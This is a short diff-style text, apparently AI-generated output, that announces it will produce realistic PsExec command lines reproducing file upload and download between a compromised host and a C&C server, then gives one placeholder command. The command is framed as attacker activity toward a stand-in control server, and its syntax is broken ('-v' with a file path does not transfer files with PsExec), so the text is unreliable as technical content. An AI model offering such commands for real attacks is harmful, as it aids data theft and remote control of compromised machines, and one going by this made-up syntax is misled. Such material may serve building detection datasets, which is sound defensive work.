@@ -1,0 +1,5 @@
+Based on the attack description, I will generate realistic command lines using only the tool PsExec to reproduce the file upload and download behavior between the compromised system and the C&C server.
+
+Here are the commands:
+
+Command:`psexec \\<CnC_Server_IP> -s -u <username> -v <file_path>`
